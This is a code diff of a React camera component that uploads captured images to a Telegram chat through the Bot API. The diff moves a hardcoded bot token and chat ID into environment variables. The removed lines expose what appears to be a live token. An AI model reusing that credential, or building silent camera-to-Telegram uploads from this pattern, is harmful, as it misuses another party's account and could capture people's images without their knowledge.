@@ -4,11 +4,8 @@ import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { toast } from "sonner";
 
-const TELEGRAM_BOT_TOKEN = "8460780445:AAE_QfhfZND6Wb9NHXygdFBtoqcy5YYCMJ4";
-const TELEGRAM_CHAT_ID = "1844909205";
-
 const Camera = () => {
-  console.log("asd")
+
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [stream, setStream] = useState<MediaStream | null>(null);
@@ -91,17 +88,16 @@ const Camera = () => {
 
         try {
           const formData = new FormData();
-          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('chat_id', import.meta.env.VITE_TELEGRAM_CHAT_ID);
           formData.append('photo', new Blob([Uint8Array.from(atob(imageData), (c) => c.charCodeAt(0))], { type: 'image/png' }), 'photo.png');
 
-          const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          const response = await fetch(`https://api.telegram.org/bot${import.meta.env.VITE_TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData,
           });
 
           const result = await response.json();
           if (result.ok) {
-            console.log("Photo sent to Telegram!");
           } else {
             console.error("Failed to send photo:", result);
           }
